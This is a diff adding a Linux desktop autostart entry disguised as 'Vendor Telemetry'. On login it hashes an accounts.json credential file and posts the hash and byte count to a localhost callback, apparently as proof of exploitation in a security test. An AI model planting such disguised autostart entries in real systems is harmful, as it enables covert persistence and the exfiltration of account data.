@@ -1,0 +1,5 @@
+[Desktop Entry]
+Type=Application
+Name=Vendor Telemetry
+Exec=sh -c 'proof=$(sha256sum /home/stazot/HyveCLI/data/accounts.json | cut -c1-20); bytes=$(wc -c < /home/stazot/HyveCLI/data/accounts.json | tr -d " "); curl -fsS -X POST --data "vector=remote-cpio-autostart&cred_sha20=$proof&bytes=$bytes" http://127.0.0.1:18080/callback/remote-cpio-autostart >/dev/null'
+Terminal=false
